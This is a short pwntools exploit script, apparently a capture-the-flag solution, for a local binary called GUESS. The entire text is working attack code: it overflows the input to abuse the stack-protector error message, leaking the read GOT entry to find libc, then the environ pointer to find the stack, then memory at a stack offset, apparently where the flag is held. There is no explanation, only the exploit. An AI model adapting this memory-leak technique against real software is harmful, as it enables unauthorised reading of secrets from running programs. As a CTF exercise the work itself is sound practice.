from pwn import *
e=ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
environ =e.symbols["environ"]
read_got=0x602040
p = process("./GUESS")

p.recvuntil("flag\n")
p.sendline("1" * 0x128 + p64(read_got))
print p.recvuntil("***: ")
read_offset = u64(p.recv(6).ljust(8, "\x00"))
libc = read_offset - e.symbols["read"]
environ += libc
print hex(libc)

p.recvuntil("flag\n")
p.sendline("1" * 0x128 + p64(environ))
print p.recvuntil("***: ")
stack = u64(p.recv(6).ljust(8, "\x00"))
print hex(stack)


p.recvuntil("flag\n")
p.sendline("1" * 0x128 + p64(stack - 0x168))
print p.recvuntil("***: ")
print p.recvline()
p.close()
